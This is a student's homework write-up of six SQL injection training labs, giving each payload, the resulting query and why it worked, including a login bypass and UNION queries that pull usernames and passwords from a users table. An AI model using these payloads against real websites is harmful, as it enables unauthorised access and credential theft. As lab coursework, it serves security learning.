# Week 9 – SQL Injection Homework

## Lab 1 – Retrieve Hidden Data


**Payload:** `Gifts' OR 1=1--`

**SQL query produced (approximate):**

SELECT * FROM products
WHERE category = 'Gifts' OR 1=1--' AND released = 1;

**Why it worked:**
The single quote closes the category string. OR 1=1 makes the condition always true, and -- comments out the remaining SQL, including the restriction on unreleased products.

**Result:** Lab solved successfully.

## Lab 2 – Login Bypass

**Payload:** `administrator'--`

**Password entered:** `test123`

**SQL query produced (approximate):**

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'test123';
```

**Why it worked:**
The single quote closes the username string, and -- comments out the remaining SQL, including the password check. This allowed me to log in as administrator without knowing the real password.

**Result:** Lab solved successfully.

## Lab 3 – UNION: Retrieve Data from Other Tables


**Payload:** `Gifts' UNION SELECT username,password FROM users--`

**SQL query produced (approximate):**

```sql
SELECT name, description FROM products
WHERE category = 'Gifts'
UNION SELECT username, password FROM users--' AND released = 1;
```

**Why it worked:**
UNION SELECT combined product results with usernames and passwords from the users table. Both queries returned two compatible columns, allowing the database to display the additional data.

**Result:** Lab solved. Retrieved the administrator credentials and successfully logged in.

## Lab 4 – Determine the Number of Columns
**Payloads tested:**
- `Gifts' ORDER BY 1--` – Worked
- `Gifts' ORDER BY 2--` – Worked
- `Gifts' ORDER BY 3--` – Worked
- `Gifts' ORDER BY 4--` – Error

**Final payload:** `Gifts' UNION SELECT NULL,NULL,NULL--`

**SQL query produced (approximate):**

SELECT col1, col2, col3 FROM products
WHERE category = 'Gifts'
UNION SELECT NULL, NULL, NULL--';

**Why it worked:**
ORDER BY 4 caused an error, while ORDER BY 3 worked. This showed that the query returns exactly 3 columns. The UNION SELECT statement succeeded because it also returned 3 columns.

**Result:** Lab solved successfully.

## Lab 5 – Find a Column Containing Text

**Payloads tested:**
- `Tech gifts' UNION SELECT 'u0srAH',NULL,NULL--` – Error
- `Tech gifts' UNION SELECT NULL,'u0srAH',NULL--` – Worked

**Final payload:** `Tech gifts' UNION SELECT NULL,'u0srAH',NULL--`

**SQL query produced (approximate):**

SELECT col1, col2, col3 FROM products
WHERE category = 'Tech gifts'
UNION SELECT NULL, 'u0srAH', NULL--';

**Why it worked:**
The first column did not accept text and returned an error. The second column accepted the string because its data type supports text. NULL was used for the other columns to avoid data type conflicts.

**Result:** Lab solved successfully. Column 2 accepts text.
## Lab 6 – Retrieve Multiple Values in One Column

**Payloads tested:**
- `Gifts' UNION SELECT NULL,NULL--` – Worked
- `Gifts' UNION SELECT NULL,'hello'--` – Worked

**Final payload:**
`Gifts' UNION SELECT NULL,username||'~'||password FROM users--`

**SQL query produced (approximate):**

```sql
SELECT name, description FROM products
WHERE category = 'Gifts'
UNION SELECT NULL, username || '~' || password
FROM users--';
```

**Why it worked:**
The query returned two columns, with the second accepting text. The `||` operator combined each username and password into a single value, separated by `~`. This allowed both values to appear in one column.

**Result:** Lab solved successfully. Retrieved the administrator credentials and logged in.